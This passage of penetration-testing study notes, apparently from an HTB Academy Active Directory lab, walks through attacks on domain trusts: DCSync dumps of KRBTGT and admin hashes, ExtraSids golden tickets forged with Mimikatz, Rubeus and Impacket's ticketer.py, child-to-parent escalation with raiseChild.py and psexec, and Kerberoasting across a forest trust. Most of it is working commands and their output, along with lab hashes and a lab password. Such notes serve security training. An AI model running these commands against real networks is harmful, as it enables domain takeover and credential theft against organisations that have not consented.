DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

## Using Powerview

```powershell
PS C:\htb> Import-Moduel .\powerview.ps1
PS C:\htb> Get-DomainTrust

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 16.png>)

## **Attacking Domain Trusts - Child -> Parent Trusts - from Windows**

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

## **ExtraSids Attack - Mimikatz**

#### **Obtaining the KRBTGT Account's NT Hash using Mimikatz**

`KRBTGT` is a service account for the KDC in AD.

* `PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

We can use the PowerView `Get-DomainSID` function to get the SID for the child domain,

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

At this point, we have gathered the following data points:

* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
* The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Currently we donot have access

* `PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`

#### **Creating a Golden Ticket with Mimikatz**

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

we can confirm a kerberos ticket is in memory using `klist` command

Now running this command, we have access.`PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$`

* `ls \\academy-ea-dc01.inlanefreight.local\c$` → listing the entire C: Drive of the Domain Controller

## **ExtraSids Attack - Rubeus**

* `PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` →creating golden ticket using Rubeus
* `klist` to confirm ticket is in Memory

### **Performing a DCSync Attack against `lab_adm` domain user**

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**

#### **Performing DCSync with secretsdump.py**

```
dollarboysushil@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

#### **Performing SID Brute Forcing using lookupsid.py**

* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
* `dollarboysushil@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` → filtering out just the DOMAIN SID

#### **Grabbing the Domain SID & Attaching to Enterprise Admin's RID**

* `dollarboysushil@htb[/htb]**$** lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f` → from DCSync using secretsdump.py
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689` → from lookupsid.py
* The name of a target user in the child domain (does not need to exist!): `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`→ from lookupsid.py

## **Constructing a Golden Ticket using ticketer.py**

```
dollarboysushil@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

ticket will be saved in .ccache, we have to setup a `KRB5CCNAME` Environment Variable

* `export KRB5CCNAME=hacker.ccache`
* `dollarboysushil@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` → getting System shell using impacket’s psexec

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain.

* `dollarboysushil@htb[/htb]**$** raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`

## **Breaking Down Boundaries**

## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows**

#### **Enumerating Accounts for Associated SPNs Using Get-DomainUser Using Power view**

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

* `PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`

## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**

Getting the SPNs

* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` → specifying -request flag gives us the ricket.

## **Hunting Foreign Group Membership with Bloodhound-python**

*   `dollarboysushil@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` → for inlanefreight.local

    we can then compress the result into zip file

    `zip -r ilfreight_bh.zip *.json`
* `dollarboysushil@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2` → for freightlogistics.local

#### **Viewing Dangerous Rights through BloodHound**

![Untitled](<../.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 17.png>)
